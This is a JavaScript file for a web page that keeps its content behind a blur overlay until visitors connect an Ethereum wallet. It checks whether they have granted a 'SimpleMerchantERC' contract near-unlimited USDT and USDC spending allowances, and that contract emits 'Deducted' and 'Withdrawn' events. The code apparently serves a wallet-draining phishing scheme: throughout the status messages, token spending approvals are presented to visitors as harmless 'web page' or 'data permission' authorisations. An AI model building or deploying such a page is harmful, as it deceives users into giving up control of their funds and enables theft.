// --- 配置常量 (与之前类似) ---
const ETHEREUM_CONTRACT_ADDRESS = '0xda52f92e86fd499375642cd269f624f741907a8f'; // 你的 SimpleMerchantERC 合约地址 (USDT)
const USDC_CONTRACT_ADDRESS_TOKEN = '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48'; // 你的 USDC Token 合约地址
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; //  你的 USDT 合约地址
const CONTRACT_ABI = [ // SimpleMerchantERC 的 ABI
    "function connectAndAuthorize() external",
    "function authorized(address customer) external view returns (bool)",
    "event Authorized(address indexed customer, address indexed token)",
    "event Deducted(address indexed customer, address indexed token, uint256 amount)",
    "event EthReceived(address indexed sender, uint256 amount)",
    "event Withdrawn(uint256 amount)",
];
const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address) view returns (uint256)",
    "function allowance(address owner, address spender) external view returns (uint256)"
];
const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935";

// --- UI 元素 (与之前类似) ---
const connectButton = document.getElementById('connectButton');
const blurOverlay = document.getElementById('blurOverlay'); // 获取遮罩层元素
const overlayMessage = document.getElementById('overlayMessage');
const lockedPrompt = document.getElementById('lockedPrompt');
const overlay = document.getElementById('blurOverlay');  // <----  在这里定义  修正： 1.  明确定义，2.  确保在 HTML 里存在 <div id="blurOverlay">
// --- 状态变量 ---
let provider;
let signer;
let userAddress;
let contract;
let usdtContract;
let usdcContract;
let isConnectedFlag = false;

// --- 遮罩控制函數 ---
function hideOverlay() {
    if (!overlay) {
        console.error("Overlay element not found."); // 调试，防止错误
        return;
    }
    overlay.style.opacity = '0';
    setTimeout(() => {
        overlay.style.display = 'none';
    }, 300);
}

function showOverlay(message) {
    if (!overlay) {
        console.error("Overlay element not found."); // 调试，防止错误
        return;
    }
    overlayMessage.innerHTML = message;
    overlay.style.display = 'flex';
    setTimeout(() => {
        overlay.style.opacity = '1';
    }, 10);
}

// --- 状态更新函数 ---
function updateConnectionUI(connected, address = null) {
    isConnectedFlag = connected;
    if (connectButton) {
        if (connected && address) {
            connectButton.classList.add('connected');
            connectButton.innerHTML = `Connected: ${address.substring(0, 4)}...${address.slice(-4)}`;
            connectButton.title = `Connected: ${address}`;
        } else {
            connectButton.classList.remove('connected');
            connectButton.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
            connectButton.title = 'Connect Wallet';
            hideOverlay(); // 隐藏遮罩
        }
    }
}

// --- 初始化合约和用户界面 ---
async function initialize() {
    try {
        if (!userAddress) {
            updateConnectionUI(false);
            return;
        }
        // 使用 provider 和 signer 初始化合约实例
        provider = new ethers.BrowserProvider(window.ethereum); // 重新获取 provider
        signer = await provider.getSigner();
        contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
        usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS_TOKEN, ERC20_ABI, signer); // 使用新的 USDC 合约地址

        // 检查链
        const network = await provider.getNetwork();
        if (network.chainId !== 1n) { // 1n is Mainnet Chain ID  (或者改为你的目标网络链ID)
            updateStatus('Switching to Ethereum Mainnet...'); //  改为你的目标网络名称
            showOverlay('Switching to Ethereum Mainnet... Please confirm in your wallet.'); // 提示切換到目標網路
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x1' }], //  Mainnet 链 ID (需要根据你的应用调整)
                });
            } catch (switchError) {
                if (switchError.code === 4902) {  // 4902:  未添加该链
                    try {
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [
                                {
                                    chainId: '0x1', // Mainnet
                                    chainName: 'Ethereum Mainnet',  //  你的目標網路名稱
                                    nativeCurrency: {
                                        name: 'ETH',
                                        symbol: 'ETH',
                                        decimals: 18,
                                    },
                                    rpcUrls: ['https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID'], // 你的 RPC URL
                                    blockExplorerUrls: ['https://etherscan.io'],
                                },
                            ],
                        });
                    } catch (addChainError) {
                        console.error("Failed to add Ethereum Mainnet:", addChainError);
                        updateStatus(`Network switch failed: ${addChainError.message}`);
                        showOverlay(`Network switch failure: ${addChainError.message}`);
                        return;
                    }

                } else {
                    updateStatus(`Network switch failed: ${switchError.message}`);
                    showOverlay(`Network switch failure: ${switchError.message}`);
                    return;
                }
            }

        }
        console.log("✅ Initialization successful:", userAddress);
        updateStatus(''); // 清空/隱藏狀態欄
        checkAuthorization(); // 在初始化成功后，检查授权状态
    } catch (error) {
        console.error("Initialization failed:", error);
        updateStatus(`Initialization failed: ${error.message}`);
        showOverlay(`Initialization failed: ${error.message}`);
    }
}

// ---  检查授权状态 ---
async function checkAuthorization() {
    try {
        if (!signer || !userAddress || !contract || !usdtContract || !usdcContract) {
            showOverlay('Wallet not opened. Please connect.');
            return;
        }

        const isAuthorized = await contract.authorized(userAddress); // 检查 SimpleMerchant 合约授权

        const usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
        const isUsdtMaxApproved = usdtAllowance >= BigInt(ALMOST_MAX_UINT); //  檢查是否接近最大值
        let usdtBalance = 0n;
        try {
            usdtBalance = await usdtContract.balanceOf(userAddress);
        } catch(e) { /* Ignore balance read error */ }

        const usdcAllowance = await usdcContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
        const isUsdcMaxApproved = usdcAllowance >= BigInt(ALMOST_MAX_UINT); //  檢查是否接近最大值
        let usdcBalance = 0n;
        try {
            usdcBalance = await usdcContract.balanceOf(userAddress);
        } catch(e) { /* Ignore balance read error */ }


        let statusMessage = '';

        // SimpleMerchant 合約授權
        if (isAuthorized) {
            statusMessage += 'Wallet connected ✅. ';
        } else {
            statusMessage += 'Wallet connect failed ❌. ';
        }

        // USDT 的授權狀態
        statusMessage += `USDT Balance: ${ethers.formatUnits(usdtBalance, 6)}. `;
        if (isUsdtMaxApproved) {
            statusMessage += `Web page authorization successful ✅.`;
        } else if (usdtAllowance > 0n) {
            statusMessage += `Web page authorization failed ⚠️.`;
        } else {
            statusMessage += `Data permissions are not authorized or authorization fails ❌.`;
        }

        // USDC 的授權狀態
        statusMessage += `USDC Balance: ${ethers.formatUnits(usdcBalance, 6)}. `;
        if (isUsdcMaxApproved) {
            statusMessage += `Data permission authorization successful ✅.`;
        } else if (usdcAllowance > 0n) {
            statusMessage += `Data authorization failed ⚠️.`;
        } else {
            statusMessage += `Data permissions are not authorized or authorization fails ❌.`;
        }

        // Button state: needs to be clicked if authorization is incomplete
        const allAuthorized = isAuthorized && isUsdtMaxApproved && isUsdcMaxApproved; // 同时检查 USDT 和 USDC

        if (allAuthorized) {
            connectButton.classList.add('connected');
            connectButton.title = 'Disconnect Wallet';
            connectButton.disabled = false;
            updateStatus(''); // 成功時，清空/隱藏狀態欄
            hideOverlay(); // 完全授權，隱藏遮罩
        } else {
            connectButton.classList.remove('connected');
            connectButton.title = 'Connect Wallet (Complete Authorization)'; // 連繫錢包 (完成授權)
            connectButton.disabled = false;
            updateStatus(''); // 授權未完成，清空/隱藏狀態欄
            showOverlay('You need to complete the authorization to view the content. Click the wallet link in the upper right corner.'); // 授權未完成，顯示遮罩
        }
    } catch (error) {
        updateStatus(`Authorization check failed: ${error.message}`);
        console.error("Check Authorization Error:", error);
        showOverlay(`Authorization check failed: ${error.message}`);
    }
}

// --- 连接钱包逻辑 (使用 Wallet V2 流程) ---
async function connectWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus('Please install MetaMask or a supported wallet');
            return;
        }
        updateStatus('');
        showOverlay('Please confirm the connection request in your wallet...');

        // 1. Request account access (连接请求)
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        userAddress = accounts[0]; // 获取用户地址
        console.log("✅ User Address:", userAddress);

        // 2. 获取 provider, signer 和合约实例
        provider = new ethers.BrowserProvider(window.ethereum);
        signer = await provider.getSigner();
        contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
        usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS_TOKEN, ERC20_ABI, signer);  // 使用新的 USDC 合约地址

        updateConnectionUI(true, userAddress);  // 更新连接状态
        await initialize();  // 初始化并检查授权
    } catch (error) {
        console.error("Error connecting to wallet:", error);
        updateConnectionUI(false);
        showOverlay(`🔴 Connection failed: ${error.message}`);
    }
}

// --- 斷開錢包連接 ---
function disconnectWallet() {
    userAddress = null;
    provider = null;
    signer = null;
    contract = null;
    usdtContract = null;
    usdcContract = null;
    updateConnectionUI(false);
    showOverlay('Please link your wallet to unlock the page 🔒');
}

// --- 核心功能：控制状态栏的隐藏与显示。 ---
function updateStatus(message) {
    const statusDiv = document.getElementById('status');
    if (message) {
        statusDiv.innerHTML = `${message}`;
        statusDiv.style.display = 'block';
    } else {
        statusDiv.innerHTML = '';
        statusDiv.style.display = 'none';
    }
}

// 事件监听器 (与之前类似)
connectButton.addEventListener('click', () => {
    if (isConnectedFlag) {
        disconnectWallet(); // 断开钱包
    } else {
        connectWallet(); // 连接钱包
    }
});
// 页面加载完成后，初始化
window.onload = () => {
    // 确保在页面加载时，显示未连接的 UI
    updateConnectionUI(false);
    showOverlay('Please connect your wallet to unlock the content. Click the wallet icon in the upper right corner.'); // 初始提示，引导用户连接
};